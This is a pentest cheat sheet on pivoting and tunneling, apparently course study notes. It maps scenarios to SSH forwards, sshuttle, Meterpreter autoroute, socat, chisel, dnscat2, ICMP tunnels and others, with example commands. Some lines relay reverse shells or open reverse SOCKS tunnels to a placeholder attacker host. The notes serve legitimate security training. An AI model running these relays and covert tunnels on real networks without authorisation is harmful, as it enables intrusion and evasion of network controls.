|Situation|Use|Command|
|---|---|---|
|I have SSH creds to pivot host, need to reach internal subnet with any tool|**SSH Dynamic Port Forward (SOCKS) + proxychains**|`ssh -D 9050 user@pivot` + `proxychains nmap ...`|
|I have SSH creds, want zero per-command config, whole subnet|**Sshuttle**|`sudo sshuttle -r user@pivot 172.16.5.0/23 -v`|
|I need a single specific remote port exposed locally|**SSH Local Forward**|`ssh -L local_port:target:port user@pivot`|
|I need to expose a local port/service back through the pivot (reverse)|**SSH Remote Forward**|`ssh -R remote_port:local:port user@pivot`|
|I already have a Meterpreter session on the pivot|**Meterpreter `autoroute` + `socks_proxy` + proxychains**|`run autoroute -s <subnet>` then `use auxiliary/server/socks_proxy`|
|I need a quick TCP relay, no SSH/creds required, just piping bytes|**Socat (reverse shell redirector)**|`socat TCP4-LISTEN:port,fork TCP4:attackhost:port`|
|Target uses a bind shell payload and I need to relay to it|**Socat (bind shell redirector)**|`socat TCP4-LISTEN:port,fork TCP4:target:bindport`|
|I'm on a Windows host, no SSH client, but PuTTY/Plink available|**Plink.exe (+ Proxifier for GUI apps)**|`plink -ssh -D 9050 user@pivot`|
|I'm on Windows, need to forward a single port, no extra tools allowed|**Netsh portproxy**|`netsh interface portproxy add v4tov4 listenport=X listenaddress=0.0.0.0 connectport=Y connectaddress=Z`|
|No SSH, but HTTP(S) egress is open (web proxy environment)|**Rpivot**|`python2 server.py --proxy-port 9050 --server-port 9999` (attacker) / `python2 client.py --server-ip X --server-port 9999` (target)|
|Need a lightweight cross-platform SOCKS5 tunnel over HTTP/WS, firewall-restrictive|**Chisel**|`chisel server -p 8000 --reverse` (attacker) / `chisel client attacker:8000 R:socks` (target)|
|Everything blocked except DNS resolution — last resort|**Dnscat2**|`ruby dnscat2.rb` (server) / `dnscat2-client.exe` (target) — slow, use sparingly|
|Everything blocked except ICMP (ping allowed)|**ICMP Tunneling (icmpsh / ptunnel)**|Attacker listens, target pings encapsulated data|
|I only have RDP access to a jump host, no shell at all|**SocksOverRDP**|Load DLL via RDP virtual channel, creates local SOCKS proxy tied to RDP session|
|I've pivoted once but need to go one network deeper|**Double Pivot**|Chain two of the above — e.g., SSH `-D` on pivot 1, then proxychains SSH into pivot 2, `-D` again, update proxychains for both hops|

---

## Priority Order to Learn (80/20)

1. **SSH `-D` + proxychains** — the default, works almost everywhere you have SSH.
2. **Sshuttle** — fast alternative to proxychains when you have SSH and want less friction.
3. **Chisel** — best fallback when SSH isn't available but HTTP is.
4. **Socat** — go-to for quick TCP relays / redirectors without needing full tunnel infra.
5. Everything else (Plink, Netsh, Rpivot, Dnscat2, ICMP, SocksOverRDP) — know the syntax and scenario, practice once, keep notes. These are "constraint of last resort" tools you reach for when 1–4 don't apply.

---

## One-Line Reminders

- **Proxychains** = app-level, must prefix every command.
- **Sshuttle** = OS-level (iptables), transparent, SSH only.
- **Socat** = dumb relay, no auth, no encryption, just forwards bytes.
- **Chisel** = SSH-like tunnel over HTTP, works when firewalls block real SSH.
- **Plink** = Windows' SSH client equivalent; pair with Proxifier for GUI apps (mstsc, etc.).
- **Netsh portproxy** = native Windows, no extra binary needed, single port only.
- **Rpivot** = for HTTP-proxy-only egress, no SSH.
- **Dnscat2 / ICMP tunnel** = last resort, slow, used when literally everything else is blocked.
- **SocksOverRDP** = RDP-only access scenario, tunnels via RDP virtual channel.
- **Double pivot** = same tools, just chained twice — update proxychains config for each hop.
